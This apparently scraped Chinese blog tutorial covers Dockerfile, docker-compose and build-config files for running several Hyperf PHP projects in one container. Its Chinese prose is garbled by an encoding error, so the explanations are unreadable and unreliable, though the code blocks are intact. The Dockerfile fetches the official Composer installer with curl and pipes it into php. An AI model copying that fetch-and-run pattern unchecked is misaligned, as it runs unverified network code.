                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å†™åœ¨å‰é¢</h3>
<blockquote>
<p>æœ¬æ–‡ä»¥éƒ¨ç½²æœ¬åœ°å¼€å‘ç¯å¢ƒï¼Œä»¥å®ç°å¿«é€Ÿéƒ¨ç½²ä¸ºåŸºå‡†ã€æ–¹ä¾¿å¼€å‘ä¸ºå‰æåšè¯´æ˜</p>
</blockquote>
<h3 data-id="heading-1">èƒŒæ™¯</h3>
<p>æœ¬äººåœ¨å®é™…å·¥ä½œè¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨ hyperf æ¡†æ¶å¼€å‘æ—¶é‡åˆ°è¿™ç§æƒ…å†µï¼š</p>
<ul>
<li>åŒæ—¶å¼€å‘å¤šä¸ªé¡¹ç›®</li>
<li>åŒæ—¶ä½¿ç”¨ä¸åŒçš„ hyperf æ¡†æ¶ç‰ˆï¼ˆ2.xã€3.xï¼‰</li>
<li>ä¸åŒé¡¹ç›®å¯¹æ¥ä¸åŒçš„æ•°æ®åº“ï¼ˆMysqlã€Oracleã€Sqlserverï¼‰</li>
</ul>
<p>é‡åˆ°çš„é—®é¢˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>2.x å’Œ 3.x å¯¹ php ç‰ˆæœ¬å’Œ swoole ç‰ˆæœ¬ä¸ä¸€æ ·</li>
<li>æ¯ä¸ª php ç‰ˆæœ¬éœ€è¦å•ç‹¬å®‰è£…å¯¹åº”çš„ æ‰©å±•</li>
<li>ä¸åŒçš„ php ç‰ˆæœ¬ï¼Œcomposer éœ€è¦é‡æ–°å®‰è£…</li>
<li>é¡¹ç›®ä¸­ä½¿ç”¨ composer æ·»åŠ æ‰©å±•åŒ…æ—¶ï¼Œè¿˜è¦å¯¹åº”è‡ªå·±çš„é¡¹ç›®ç‰ˆæœ¬ä½¿ç”¨æ­£ç¡®çš„ composer</li>
<li>... ... ...</li>
</ul>
<p>è¿™ä¸€å¥—ä¸‹æ¥ï¼Œè€—è´¹æ—¶é—´é•¿ï¼Œå¦‚æœæ¢å°è®¾å¤‡ï¼Œé‡æ–°éƒ¨ç½²ä¹Ÿå¾ˆéº»çƒ¦ï¼›</p>
<p>æ‰€ä»¥ï¼Œè€ƒè™‘åˆ°ä½¿ç”¨å®¹å™¨å¼€å‘æ¥è§£å†³å½“ä¸‹çš„å›°å±€ ... ... ...</p>
<h3 data-id="heading-2">ä¸€ã€å‡†å¤‡å·¥ä½œ</h3>
<h4 data-id="heading-3">ç¯å¢ƒå‡†å¤‡</h4>
<blockquote>
<p>åŸºäºæœ¬äººå¼€å‘ç¯å¢ƒåšè¯´æ˜</p>
</blockquote>
<ul>
<li>ä¸€ä¸ª linux ç¯å¢ƒã€å·²å®‰è£…å¥½ dockerã€docker-compose
<ul>
<li>CentOS ç‰ˆæœ¬ï¼š<code>CentOS Linux release 7.9.2009 (Core)</code></li>
<li>docker ç‰ˆæœ¬ï¼š<code>Docker version 24.0.5, build ced0996</code></li>
<li>docker-compos ç‰ˆæœ¬ï¼š<code>Docker Compose version v2.20.2</code></li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">äºŒã€å¼€å§‹éƒ¨ç½²ï¼ˆåŸºç¡€ï¼‰</h3>
<blockquote>
<p>æœ¬æ–‡ä»¥ php7.4 + hyperf2.x åšå¼€å‘ç¯å¢ƒçš„è¯´æ˜</p>
</blockquote>
<h4 data-id="heading-5">å‡†å¤‡ Dockerfile</h4>
<pre><code class="hljs language-dockerfile" lang="dockerfile">FROM php:7.4-cli-bullseye

# è®¾ç½®æ—¶åŒº
ENV TZ=Asia/Shanghai
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo $TZ &gt; /etc/timezone

# æ›´æ–°å¹¶å®‰è£…åŸºç¡€ä¾èµ–
RUN apt-get update &amp;&amp; apt-get install -y \
    --no-install-recommends libfreetype6-dev libjpeg62-turbo-dev libpng-dev libzip-dev \
    &amp;&amp; apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*

# å®‰è£… redis å’Œ swoole æ‰©å±•
RUN pecl install redis-5.3.7 swoole-4.8.13

# ç§»åŠ¨ php.ini é…ç½®æ–‡ä»¶
RUN mv "$PHP_INI_DIR/php.ini-production" "$PHP_INI_DIR/php.ini"

# å¯ç”¨æ‰©å±•
RUN docker-php-ext-enable redis swoole

# é…ç½® GD æ‰©å±•
RUN docker-php-ext-configure gd --with-jpeg=/usr/include --with-freetype=/usr/include/freetype2/

# å®‰è£… PHP æ‰©å±•
RUN docker-php-ext-install -j$(nproc) pcntl gd zip pdo_mysql opcache

# æ·»åŠ è‡ªå®šä¹‰ PHP é…ç½®
RUN echo "swoole.use_shortname='Off'" &gt;&gt; /usr/local/etc/php/conf.d/default.ini \
    &amp;&amp; echo "memory_limit=1G" &gt;&gt; /usr/local/etc/php/conf.d/default.ini \
    &amp;&amp; echo "opcache.enable_cli='on'" &gt;&gt; /usr/local/etc/php/conf.d/default.ini

# å®‰è£… Composer
ENV COMPOSER_HOME /root/composer
RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer
ENV PATH $COMPOSER_HOME/vendor/bin:$PATH

# æŒ‡å®šå·¥ä½œç›®å½•ï¼Œå¦‚æœä½¿ç”¨docker execè¿›å…¥å®¹å™¨æ—¶ï¼Œé»˜è®¤ç›®å½•å°±æ˜¯æŒ‡å®šçš„å·¥ä½œç›®å½•ï¼Œå¦‚/data
WORKDIR /opt/www
</code></pre>
<p>é’ˆå¯¹è¿™ä»½æ–‡æ¡£ï¼Œåšä¸€äº›å°è¯´æ˜ï¼š</p>
<ul>
<li>åŸºç¡€é•œåƒä½¿ç”¨ <code>-bullseye</code> ç‰ˆæœ¬ï¼šæœ‰äº›åŸºç¡€ä¾èµ–åœ¨å…¶ä»–ç‰ˆæœ¬å·²ç»ä¸åšç»´æŠ¤äº†ï¼Œéœ€è¦è‡ªå·±è®¾ç½®å¯¹åº”çš„æºåœ°å€ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œè€Œè¯¥ç‰ˆæœ¬åŸºäºæœ€æ–°çš„ debain åšå…¼å®¹çš„</li>
<li>è¯¥æ–‡ä»¶æ²¡æœ‰è®¾ç½®å¯åŠ¨å‘½ä»¤ï¼šæ˜¯ä¸ºäº†ç»™å¤šä¸ªé¡¹ç›®è‡ªå·±çš„å¯åŠ¨å‘½ä»¤ç•™ç©ºé—´</li>
</ul>
<h4 data-id="heading-6">æ„å»ºæ–°é•œåƒ</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">æ‰§è¡Œæ„å»º</span>
docker build -t é•œåƒåç§°:æ ‡ç­¾ .
<span class="hljs-meta prompt_">
# </span><span class="bash">æ£€æŸ¥æ–°é•œåƒ</span>
docker images
</code></pre>
<h4 data-id="heading-7">å®¹å™¨ç¼–æ’</h4>
<blockquote>
<p>docker-compose.yml</p>
</blockquote>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span>
<span class="hljs-attr">services:</span>
        <span class="hljs-attr">php:</span>
                <span class="hljs-attr">image:</span> <span class="hljs-string">php-hyperf:7.4-cli-bullseye</span>
                <span class="hljs-attr">volumes:</span>
                        <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime</span>
                        <span class="hljs-bullet">-</span> <span class="hljs-string">/www:/opt/www</span>
                <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>
                <span class="hljs-attr">container_name:</span> <span class="hljs-string">hyperf01</span>
<span class="hljs-comment">#                networks:</span>
<span class="hljs-comment">#                        - php-net</span>
<span class="hljs-comment">#                ports:</span>
<span class="hljs-comment">#                        - 9505:9501</span>
                <span class="hljs-attr">network_mode:</span> <span class="hljs-string">"host"</span>
                <span class="hljs-attr">tty:</span> <span class="hljs-literal">true</span>
                <span class="hljs-attr">stdin_open:</span> <span class="hljs-literal">true</span>

<span class="hljs-comment">#                command: ["php", "bin/hyperf.php", "start"]</span>
<span class="hljs-comment">#networks:</span>
<span class="hljs-comment">#        php-net:</span>
<span class="hljs-comment">#                external:</span>
<span class="hljs-comment">#                       name: php-net</span>

</code></pre>
<p>é’ˆå¯¹è¿™ä»½æ–‡æ¡£ï¼Œåšä¸€äº›å°è¯´æ˜ï¼š</p>
<blockquote>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä½¿ç”¨ docker-compose ç¼–æ’å®¹å™¨æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span>
<span class="hljs-attr">services:</span>
        <span class="hljs-attr">php:</span>
                <span class="hljs-attr">image:</span> <span class="hljs-string">php-hyperf:7.4-cli-bullseye</span>
                <span class="hljs-attr">volumes:</span>
                        <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime</span>
                        <span class="hljs-bullet">-</span> <span class="hljs-string">/www/hyperf01:/opt/www/hyperf01</span>
                <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>
                <span class="hljs-attr">container_name:</span> <span class="hljs-string">hyperf01</span>
                <span class="hljs-attr">networks:</span>
                        <span class="hljs-bullet">-</span> <span class="hljs-string">php-net</span>
                <span class="hljs-attr">ports:</span>
                        <span class="hljs-bullet">-</span> <span class="hljs-number">9505</span><span class="hljs-string">:9501</span>
                <span class="hljs-attr">command:</span> [<span class="hljs-string">"php"</span>, <span class="hljs-string">"bin/hyperf.php"</span>, <span class="hljs-string">"start"</span>]
<span class="hljs-attr">networks:</span>
        <span class="hljs-attr">php-net:</span>
                <span class="hljs-attr">external:</span>
                       <span class="hljs-attr">name:</span> <span class="hljs-string">php-net</span>
</code></pre>
</blockquote>
<ul>
<li><code>image</code>: Dockerfile æ„å»ºå‡ºæ¥çš„é•œåƒå</li>
<li><code>volumes</code>: æŒ‚è½½ç›®å½•
<ul>
<li>å¼€å‘ç¯å¢ƒç›®å½•ç»“æ„è§£é‡Šï¼š/www æ˜¯é¡¹ç›®ç›®å½•ï¼Œé‡Œé¢åŒ…å«å¤šä¸ªé¡¹ç›®æ–‡ä»¶å¤¹</li>
<li><strong>æ­¤å¤„æŒ‚è½½ /www ï¼Œæ˜¯ä¸ºäº†æ–¹ä¾¿åªä½¿ç”¨ä¸€ä¸ª php å®¹å™¨ï¼Œå¯ä»¥è¿è¡Œå¤šä¸ª hyperf é¡¹ç›®</strong></li>
</ul>
</li>
<li><code>command</code>: å®¹å™¨å¯åŠ¨æ—¶çš„æ‰§è¡Œå‘½ä»¤
<ul>
<li><strong>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æŒ‚è½½äº†æŒ‡å®šçš„é¡¹ç›®åç§°ï¼Œåœ¨å®¹å™¨å¯åŠ¨æ—¶éœ€è¦æŒ‡å®šå¯åŠ¨å‘½ä»¤</strong></li>
<li><strong>ä½†æ˜¯ï¼Œç›®å‰æŒ‚è½½çš„ /wwwï¼Œæ²¡æœ‰æŒ‡å®šçš„é¡¹ç›®ï¼Œå¦‚æœä½¿ç”¨ <code>command: ["php", "bin/hyperf.php", "start"]</code> å®¹å™¨ä¼šå¯åŠ¨ä¸æˆåŠŸ</strong></li>
<li><strong>æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä¸èƒ½ä½¿ç”¨ command å¯åŠ¨å‘½ä»¤ï¼Œä¹Ÿæ˜¯ä¸ºäº†æ–¹ä¾¿å¤šé¡¹ç›®å„è‡ªå¯åŠ¨</strong></li>
</ul>
</li>
<li><code>ttyã€stdin_open</code>:
<ul>
<li><strong>Dockerfileã€docker-compose ä¸­éƒ½æ²¡æœ‰äº†å¯åŠ¨å‘½ä»¤ã€å®¹å™¨å¯åŠ¨ä¸æˆåŠŸ</strong></li>
<li><strong>æ‰€ä»¥ï¼Œè¿½åŠ è¿™ä¸¤ä¸ªå‚æ•°ï¼Œå…è®¸å®¹å™¨å¯ä»¥æˆåŠŸå¯åŠ¨ï¼Œå®¹å™¨ä¸é€€å‡º</strong></li>
</ul>
</li>
<li><code>ports</code>: ç«¯å£æ˜ å°„
<ul>
<li><strong>ä¸ºäº†èƒ½ç›´æ¥ä½¿ç”¨æ¯ä¸ªé¡¹ç›®è‡ªå·±é…ç½®çš„ç«¯å£</strong></li>
<li><strong>å› ä¸ºä¸ºäº†æ–¹ä¾¿æ‰©å±•ï¼ˆåç»­è¿½åŠ æ›´å¤šçš„é¡¹ç›®ï¼‰</strong>
<ul>
<li>æ¯ä¸ªé¡¹ç›®éƒ½æœ‰è‡ªå·±çš„ç«¯å£å·ï¼Œå¦‚æœåœ¨è¿™é‡Œè®¾ç½®ï¼Œé‚£ä¹ˆæ¯å¢åŠ ä¸€ä¸ªé¡¹ç›®ï¼Œå°±éœ€è¦ä¿®æ”¹ä¸€æ¬¡ç«¯å£æ˜ å°„ï¼Œå¹¶é‡æ–°ç¼–æ’å®¹å™¨ï¼Œå¾ˆä¸æ–¹ä¾¿</li>
<li>æ‰€ä»¥å°±å–æ¶ˆäº†è¿™é‡Œçš„ç«¯å£æ˜ å°„</li>
</ul>
</li>
</ul>
</li>
<li><code>network_mode</code>: ç½‘ç»œæ¨¡å¼
<ul>
<li><strong>å›ºå®šå€¼ï¼š<code>host</code>ï¼Œå®¹å™¨å…±äº«å®¿ä¸»æœºç½‘ç»œï¼Œå¯ä»¥å®ç°ä¸ç”¨é…ç½®ç«¯å£å·</strong></li>
<li><strong>ä¸ <code>ports</code> å‚æ•°ä¸å…±å­˜</strong></li>
<li><strong>ä½¿ç”¨äº†å…±äº«ç½‘ç»œæ¨¡å¼ï¼Œé‚£ä¹ˆå°±ä¸å†éœ€è¦é…ç½®æ–°çš„ç½‘ç»œäº†ï¼Œå°±å–æ¶ˆäº† <code>networks</code> ç›¸å…³çš„å‚æ•°é…ç½®</strong></li>
</ul>
</li>
</ul>
<h4 data-id="heading-8">æ‰§è¡Œå®¹å™¨ç¼–æ’</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">åå°è¿è¡Œï¼Œåˆ›å»ºå®¹å™¨å¹¶å¯åŠ¨</span>
docker-compose up -d
</code></pre>
<h3 data-id="heading-9">ä¸‰ã€å¯åŠ¨å¹¶è¿è¡Œé¡¹ç›®</h3>
<p>å½“æˆ‘ä»¬å¯åŠ¨å¥½å®¹å™¨åã€è¿›å…¥phpå®¹å™¨ä¸­</p>
<pre><code class="hljs language-shell" lang="shell">docker exec -it hyperf01 bash
</code></pre>
<p>æ­¤æ—¶å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„é¡¹ç›®ç›®å½• <code>/opt/www</code> ï¼Œå› ä¸ºè¿™é‡ŒåŒ…å«äº†æ‰€æœ‰çš„é¡¹ç›®ç›®å½•ï¼Œæ‰¾åˆ°ä½ è‡ªå·±çš„ä½¿ç”¨ php7.x çš„é¡¹ç›®ï¼Œå¯åŠ¨å³å¯ï¼Œå¯åŠ¨æˆåŠŸåå¯ä»¥çœ‹åˆ°ç«¯å£å·å°±æ˜¯ä½ å†é¡¹ç›®ä¸­é…ç½®çš„ç«¯å£å·äº†ã€‚</p>
<p>è‡³æ­¤ï¼Œä¾¿å¯ä»¥æ„‰å¿«çš„å¼€å¯ä½ çš„ç‰›é©¬ç”Ÿæ´»äº† ... ... ...</p>
<h3 data-id="heading-10">å››ã€æå‡</h3>
<p>å‰é¢ï¼Œæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„å¯ç›´æ¥äº«ç”¨çš„ <code>Dockerfile</code> æ–‡ä»¶ï¼Œè™½ç„¶æ˜¯æ–¹ä¾¿é£Ÿç”¨ï¼Œä½†æ˜¯é—®é¢˜ä¹Ÿéšä¹‹å‡ºç°äº†ï¼š</p>
<ul>
<li>å½“å‰æ˜¯ php7.x å¦‚æœæˆ‘ä»¬è¦æ¢æˆ php8.x æ€ä¹ˆåŠå‘¢ï¼Ÿå¯¹åº”çš„ swoole æ‰©å±•ç‰ˆæœ¬ ä¹Ÿéœ€è¦ä¿®æ”¹</li>
<li>å¦‚æœæˆ‘ä»¬éœ€è¦è¿½åŠ å…¶ä»–æ‰©å±•æ€ä¹ˆåŠå‘¢ï¼Ÿ</li>
<li>... ... ...</li>
</ul>
<p>å¦‚æœæŒ‰ç…§å½“å‰çš„æ¨¡å¼ï¼Œæ¯æ¬¡å¤„ç†è¿™äº›é—®é¢˜ï¼Œéƒ½éœ€è¦å»ä¿®æ”¹ <code>Dockerfile</code> æ–‡ä»¶ï¼Œè¿™æ ·å°±æå¾—å¾ˆéº»çƒ¦ï¼Ÿæœ‰æ²¡æœ‰ä¸€ä¸ªç®€å•æœ‰æ•ˆçš„åŠæ³•å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p>
<p>æœ‰ã€æœ‰ã€æœ‰ï¼Œï¼Œï¼Œé‚£å°±æ˜¯æŠŠè¿™äº›å¯å˜ä¿¡æ¯ï¼Œæç‚¼æˆé…ç½®æ–‡ä»¶ï¼Œ<code>Dockerfile</code> ä½¿ç”¨è¯»é…ç½®çš„æ–¹å¼è¿›è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸ç”¨é¢‘ç¹çš„ä¿®æ”¹ <code>Dockerfile</code> æ–‡ä»¶äº†ï¼Œæ¯æ¬¡æœ‰å˜åŠ¨ï¼Œé‚£å°±ç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œç®€å•ç›´æ¥ã€æ–¹ä¾¿å¿«é€Ÿï¼ï¼ï¼</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ç°åœ¨æä¾›ä¸€å¥—å¯å¼€ç®±å³ç”¨çš„é…ç½®æ–¹æ¡ˆï¼Œè‡³äºä¸­é—´çš„è¸©å‘è¿‡ç¨‹å°±ç›´æ¥ç•¥è¿‡ï¼Œå½“ç„¶ï¼Œæ–¹æ¡ˆå®ç°ä¸æ­¢è¿™ä¹ˆä¸€ç§ï¼Œå¤§å®¶å¯ä»¥è‡ªè¡Œå‘æ˜ ... ... ...</p>
<h4 data-id="heading-11">ç›®å½•ç»“æ„</h4>
<blockquote>
<p>æˆ‘ä»¬ä»¥ project ä½œä¸ºæ ¹ç›®å½•åšè¯´æ˜</p>
</blockquote>
<pre><code class="hljs language-shell" lang="shell">project
|--config
   |--build.conf
|--pecl
|--source
   |--alpine_source.list
   |--debian_source.list
|--build.sh
|--Dockerfile.base
|--Dockerfile.final
</code></pre>
<ul>
<li><code>project</code>ï¼šé¡¹ç›®æ ¹ç›®å½•</li>
<li><code>project/config</code>ï¼šæ„å»ºé…ç½®æ–‡ä»¶ç›®å½•</li>
<li><code>project/config/build.conf</code>ï¼šæ„å»ºé…ç½®æ–‡ä»¶ï¼Œæ–¹ä¾¿ä¿®æ”¹æ„å»ºä¿¡æ¯</li>
<li><code>project/pecl</code>ï¼šæœ¬åœ°ä¸‹è½½æ‰©å±•ç›®å½•ï¼Œæ–¹ä¾¿ä»æœ¬åœ°å®‰è£…æ‰©å±•ï¼Œä¾‹å¦‚ï¼š<code>swoole-5.1.3.tar</code></li>
<li><code>project/source</code>ï¼šè‡ªå®šä¹‰ alpineã€debian é…ç½®æºç›®å½•</li>
<li><code>project/source/alpine_source.list</code>ï¼šè‡ªå®šä¹‰ alpine ç³»ç»Ÿæºé…ç½®ä¿¡æ¯</li>
<li><code>project/source/debian_source.list</code>ï¼šè‡ªå®šä¹‰ debian ç³»ç»Ÿæºé…ç½®ä¿¡æ¯</li>
<li><code>project/build.sh</code>ï¼šæ„å»ºæ‰§è¡Œè„šæœ¬ éœ€è¦æœ‰æ‰§è¡Œæƒé™</li>
<li><code>project/Dockerfile.base</code>ï¼šç”¨äºæ„å»ºåŸºç¡€é•œåƒï¼Œåªåš aplineã€debian ç³»ç»Ÿä¾èµ–å’Œå·¥å…·ç­‰æ›´æ–°</li>
<li><code>project/Dockerfile.final</code>ï¼šç”¨äºæ„å»ºæœ€ç»ˆé•œåƒï¼Œåˆ†é˜¶æ®µï¼šä¸€é˜¶æ®µä¸»è¦åŠŸèƒ½ --- å®‰è£…æ‰©å±•ï¼›äºŒé˜¶æ®µä¸»è¦åŠŸèƒ½ --- æ„å»ºæœ€ç»ˆé•œåƒ</li>
</ul>
<h4 data-id="heading-12">æ–‡ä»¶å†…å®¹åŠè¯´æ˜</h4>
<h5 data-id="heading-13">build.conf</h5>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">PHP åŸºç¡€é•œåƒ</span>
[base_image]
php:8.2-cli
<span class="hljs-meta prompt_">#</span><span class="bash">php:8.2-alpine</span>
<span class="hljs-meta prompt_">#</span><span class="bash">php:7.4-cli</span>
<span class="hljs-meta prompt_">#</span><span class="bash">php:7.4-alpine</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">PECL æ‰©å±•ï¼ˆpecl installï¼‰</span>
[pecl]
<span class="hljs-meta prompt_">#</span><span class="bash">swoole-4.8.13</span>
<span class="hljs-meta prompt_">#</span><span class="bash">redis-5.3.7</span>
swoole-5.1.3
redis
<span class="hljs-meta prompt_">
# </span><span class="bash">æœ¬åœ°æ‰©å±•ï¼ˆdocker-php-ext-installï¼‰</span>
[local]
pcntl
gd
zip
pdo_mysql
opcache
<span class="hljs-meta prompt_">
# </span><span class="bash">æ„å»ºæ¨¡å¼ï¼šprod / dev</span>
[mode]
dev
<span class="hljs-meta prompt_">
# </span><span class="bash">æ˜¯å¦ä½¿ç”¨è‡ªå®šä¹‰ä¾èµ–æºåœ°å€ <span class="hljs-literal">true</span> / <span class="hljs-literal">false</span></span>
[custom_source]
false
<span class="hljs-meta prompt_">
# </span><span class="bash">composer æºï¼šauto / aliyun / tencent / ustc / packagist</span>
[composer_mirror]
auto
<span class="hljs-meta prompt_">
# </span><span class="bash">php.ini é…ç½®</span>
[php]
swoole.use_shortname=Off
memory_limit=1G
opcache.enable_cli=on
<span class="hljs-meta prompt_">
# </span><span class="bash">æ„å»ºç›®æ ‡ï¼šbase / final / all</span>
[build_target]
all
<span class="hljs-meta prompt_">
# </span><span class="bash">æ˜¯å¦å¼ºåˆ¶é‡æ–°æ„å»ºåŸºç¡€é•œåƒï¼š<span class="hljs-literal">true</span> / <span class="hljs-literal">false</span></span>
[force_rebuild_base]
false
</code></pre>
<h5 data-id="heading-14">alpine_source.list</h5>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">é˜¿é‡Œäº‘æº</span>
https://mirrors.aliyun.com/alpine/v3.18/main
https://mirrors.aliyun.com/alpine/v3.18/community
<span class="hljs-meta prompt_">
# </span><span class="bash">è…¾è®¯äº‘æº</span>
<span class="hljs-meta prompt_"># </span><span class="bash">https://mirrors.cloud.tencent.com/alpine/v3.18/main</span>
<span class="hljs-meta prompt_"># </span><span class="bash">https://mirrors.cloud.tencent.com/alpine/v3.18/community</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">æ¸…åæº</span>
<span class="hljs-meta prompt_"># </span><span class="bash">https://mirrors.tuna.tsinghua.edu.cn/alpine/v3.18/main</span>
<span class="hljs-meta prompt_"># </span><span class="bash">https://mirrors.tuna.tsinghua.edu.cn/alpine/v3.18/community</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">å®˜æ–¹æºï¼ˆå¤‡ç”¨ï¼‰</span>
<span class="hljs-meta prompt_"># </span><span class="bash">https://dl-cdn.alpinelinux.org/alpine/v3.18/main</span>
<span class="hljs-meta prompt_"># </span><span class="bash">https://dl-cdn.alpinelinux.org/alpine/v3.18/community</span>

</code></pre>
<h5 data-id="heading-15">debian_source.list</h5>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">é˜¿é‡Œäº‘æº</span>
deb http://mirrors.aliyun.com/debian/ bullseye main non-free contrib
deb http://mirrors.aliyun.com/debian-security/ bullseye-security main
deb http://mirrors.aliyun.com/debian/ bullseye-updates main non-free contrib
deb http://mirrors.aliyun.com/debian/ bullseye-backports main non-free contrib
<span class="hljs-meta prompt_">
# </span><span class="bash">è…¾è®¯äº‘æº</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb http://mirrors.cloud.tencent.com/debian/ bullseye main non-free contrib</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb http://mirrors.cloud.tencent.com/debian-security/ bullseye-security main</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb http://mirrors.cloud.tencent.com/debian/ bullseye-updates main non-free contrib</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb http://mirrors.cloud.tencent.com/debian/ bullseye-backports main non-free contrib</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">æ¸…åæº</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free</span>
<span class="hljs-meta prompt_">
# </span><span class="bash">å®˜æ–¹æºï¼ˆå¤‡ç”¨ï¼‰</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb http://deb.debian.org/debian bullseye main contrib non-free</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb http://deb.debian.org/debian-security/ bullseye-security main contrib non-free</span>
<span class="hljs-meta prompt_"># </span><span class="bash">deb http://deb.debian.org/debian bullseye-updates main contrib non-free</span>

</code></pre>
